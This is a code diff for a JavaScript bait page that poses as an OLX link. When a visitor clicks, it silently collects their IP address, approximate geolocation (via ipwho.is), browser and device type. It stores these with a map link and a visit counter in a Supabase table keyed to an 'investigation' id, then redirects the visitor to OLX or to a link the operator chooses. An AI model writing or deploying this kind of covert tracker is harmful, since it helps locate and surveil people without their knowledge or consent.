@@ -10,6 +10,16 @@ document.addEventListener("DOMContentLoaded", () => {
 
     btn.addEventListener("click", async () => {
         try {
+            // Extrai o ID da URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const investigacaoId = urlParams.get('id');
+
+            if (!investigacaoId) {
+                console.error("ID da investigação não encontrado na URL");
+                window.location.href = "https://www.olx.com.br";
+                return;
+            }
+
             // Coleta IP do visitante
             const ipRes = await fetch("https://ipwho.is/");
             const ipData = await ipRes.json();
@@ -18,7 +28,6 @@ document.addEventListener("DOMContentLoaded", () => {
             const latitude = ipData.latitude?.toString() || "0.0000";
             const longitude = ipData.longitude?.toString() || "0.0000";
             const mapa_link = `https://maps.google.com/maps?q=${latitude},${longitude}&z=14&output=embed`;
-
 
             // Detecta tipo de aparelho
             const userAgent = navigator.userAgent;
@@ -31,31 +40,43 @@ document.addEventListener("DOMContentLoaded", () => {
                 aparelho = "Computador";
             }
 
-            // Dados simulados
-            const payload = {
-                url_isca: window.location.href,
-                redirecionamento: "https://www.olx.com.br",
-                ip: ip,
-                navegador: userAgent,
-                geolocalizacao,
-                aparelho: aparelho,
-                data_hora: new Date().toISOString(),
-                latitude,
-                longitude,
-                mapa_link
-            };
+            // Busca a investigação atual
+            const { data: investigacao } = await supabaseClient
+                .from("coleta_olx")
+                .select("redirecionamento, acessos")
+                .eq("id", investigacaoId)
+                .single();
 
-            // Envia os dados para Supabase
-            const { error } = await supabaseClient.from("coleta_olx").insert([payload]);
-
-            if (error) {
-                console.error("Erro ao salvar no Supabase:", error);
-            } else {
-                console.log("Dados coletados com sucesso:", payload);
+            if (!investigacao) {
+                console.error("Investigação não encontrada");
+                window.location.href = "https://www.olx.com.br";
+                return;
             }
 
-            // Redireciona para a OLX
-            window.location.href = "https://www.olx.com.br";
+            // Atualiza os dados da investigação
+            const { error } = await supabaseClient
+                .from("coleta_olx")
+                .update({
+                    ip: ip,
+                    navegador: userAgent,
+                    geolocalizacao,
+                    aparelho: aparelho,
+                    data_hora: new Date().toISOString(),
+                    latitude,
+                    longitude,
+                    mapa_link,
+                    acessos: (investigacao.acessos || 0) + 1
+                })
+                .eq("id", investigacaoId);
+
+            if (error) {
+                console.error("Erro ao atualizar no Supabase:", error);
+            } else {
+                console.log("Dados coletados com sucesso");
+            }
+
+            // Redireciona para o link configurado ou OLX por padrão
+            window.location.href = investigacao.redirecionamento || "https://www.olx.com.br";
 
         } catch (err) {
             console.error("Erro geral na coleta:", err);
